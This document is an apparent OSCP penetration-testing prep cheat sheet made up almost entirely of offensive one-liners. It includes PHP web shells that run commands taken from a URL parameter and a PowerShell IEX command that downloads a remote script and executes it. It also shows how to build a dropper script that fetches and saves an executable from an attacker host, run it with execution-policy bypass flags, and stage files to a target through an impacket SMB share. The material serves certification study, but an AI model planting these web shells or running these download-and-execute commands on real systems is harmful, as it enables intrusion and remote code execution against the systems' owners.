# OSCP_Prep

Simple php cmd shell
	<?php echo system($_GET["cmd"]); ?>
	<?php echo shell_exec($_GET["cmd"]); ?>


# Powershell download a file
	powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 


# Powershell download an execute file
	powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"


# Powershell execution restricted
	echo $storageDir = $pwd > wget.ps1
	echo $webclient = New-Object System.Net.WebClient >>wget.ps1
	echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
	echo $file = "output-file.exe" >>wget.ps1
	echo $webclient.DownloadFile($url,$file) >>wget.ps1
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	OR
	powershell.exe -nop -ep bypass -c wget.ps1



 
# Transfer file with SMB 
	sudo impacket-smbserver ROPNOP /sherad/folder

    Check share on target host:
	net view \\shareIP
	ls \\shareIP\ROPNOP
